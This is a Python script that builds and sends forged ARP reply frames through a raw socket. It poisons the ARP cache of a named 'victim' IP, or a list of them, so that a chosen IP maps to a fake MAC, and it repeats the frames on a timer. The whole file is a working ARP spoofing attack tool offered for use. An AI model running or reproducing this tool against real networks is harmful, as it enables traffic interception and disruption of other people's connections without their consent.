import socket
import struct
import uuid
import subprocess
import re
import sys
import argparse
import time

class ARP:
    def __init__(self):
        self.time = 1
        self.destmac = []
        self.locmac = []
        self.getarg()

    def getarg(self):
        parser = argparse.ArgumentParser(description='Generator fake ARP reply')
        #parser.add_argument('sourceip', type=str, help='Source (you) IP address')
        parser.add_argument('destip', type=str, help='Destination (victim) IP addr')
        parser.add_argument('changip', type=str, help='IP address for replace MAC')
        parser.add_argument('-listvaddr', type=str, nargs='+', help='list destination IP addrs')
        parser.add_argument('-iface', type=str, help='Set you interface (eth0)', default='eth0')
        parser.add_argument('-fakemac', type=str, help='Fake MAK for replace (de:ad:be:ef:ba:be)', default='de:ad:be:ef:ba:be')
        parser.add_argument('-time', type=int, help='Time', default=1)
        for key, val in vars(parser.parse_args()).items():
            print(f'Key: {key}, val: {val}')
            if(key == 'fakemac'):
                temp = val.split(':')
                self.__dict__[key] = [int('0x'+temp[i], 0) for i in range(0, len(temp))]
            else:
                try:
                    temp = val.split('.')
                    self.__dict__[key] = [int(temp[i], 0) for i in range(0, len(temp))]
                except Exception:
                    if (key == 'listvaddr' and val != None):
                        dicto = []
                        for i in range(0, len(val)):
                            temp = val[i].split('.')
                            dicto.append([int(temp[i], 0) for i in range(0, len(temp))])
                            self.__dict__[key] = dicto
                    elif (key == 'time'):
                        self.__dict__[key] = int(val)
                    else:
                        self.__dict__[key] = val
            self.__dict__[f'str{key}'] = val
            # print(self.__dict__[key])
        self.getdestmac()
        self.getlocmac()

    def getdestmac(self):
        # get mac
        pid = subprocess.Popen(['arp', '-n', self.strdestip], stdout=subprocess.PIPE)
        res = pid.communicate()[0]
        try:
            self.destmac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", str(res)).groups()[0].split(':')
        except Exception:
            print(f"Error: Not find destination MAC! Please, ping {self.strdestip}")
            sys.exit(1)
        self.destmac = [int(self.destmac[i], 16) for i in range(0, len(self.destmac))]
        print(f'Destination IP {self.strdestip}')
        print(f'Destination MAC: {self.destmac}')

    def getlocmac(self):
        # valid local MAC generate
        for i in [("%X" % uuid.getnode())[i:i+2] for i in range(0, 12, 2)]:
            if i == '':
                continue
            self.locmac.append(int(i, 16))
        if len(self.locmac) < 6:
            self.locmac.insert(0, int('00', 16))
        # print(f'Local MAC: {self.locmac}')

    def fakearp(self, list = None):
        # raw socket create
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.bind((self.iface, 0))
        chan_ip = [192, 168, 1, 1]
        fake_mak = [222, 173, 190, 239, 186, 190]
        nulls = [0x00 for i in range(0, 18)]
        ARP_FRAMES = []
        for changip in list:
            ARP_FRAMES.append([
                struct.pack('!6B', *self.destmac),   # DESTINATION MAC ADDRESS
                struct.pack('!6B', *self.locmac),  # SOURCE MAC ADDRESS
                struct.pack('!H', 0x0806),      # 0X0806 IS A ARP TYPE
                struct.pack('!H', 0x0001),      # 0X0001 IS A ETHERNET HW TYPE
                struct.pack('!H', 0x0800),      # 0X0800 IS A IPV4 PROTOCOL
                struct.pack('!B', 0x06),        # 0X06 HW SIZE (MAC)
                struct.pack('!B', 0x04),        # 0X04 PROTOCOL SIZE (IP)
                struct.pack('!H', 0x0002),      # 0x0002 IS A ARP REPLY
                struct.pack('!6B', *self.fakemac),   # SENDER MAC
                struct.pack('!4B', *changip),    # SENDER IP
                struct.pack('!6B', *self.destmac),  # TARGET MAC
                struct.pack('!4B', *self.destip),    # TARGET IP
                struct.pack('!18B', *nulls)
            ])                              # 42 bytes, need 60
        for i in range(0, self.time):
            for ARP_FRAME in ARP_FRAMES:
                sock.send(b''.join(ARP_FRAME))
            time.sleep(1)
        sock.close()


if __name__ == '__main__':
    arp = ARP()
    if(arp.listvaddr != None):
        list = arp.listvaddr;
        list.append(arp.changip)
        print(list)
        arp.fakearp(arp.listvaddr)
    else:
        arp.fakearp([arp.changip])